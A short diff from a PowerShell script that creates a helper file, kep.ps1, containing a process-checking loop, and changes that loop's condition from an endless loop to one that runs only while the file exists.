@@ -11,7 +11,8 @@ $testkep = Test-Path kep.ps1
 if (!($testkep)){
 New-Item kep.ps1
 Set-Content kep.ps1 '
-     while ($true) {                  
+     $truepath = Test-Path kep.ps1
+     while ($truepath) {                  
          $Procs = Get-Process powershell -ErrorAction SilentlyContinue  
          if (($procs).Count -eq 1) { 
              Start-Sleep -Seconds (3 * 60)                  
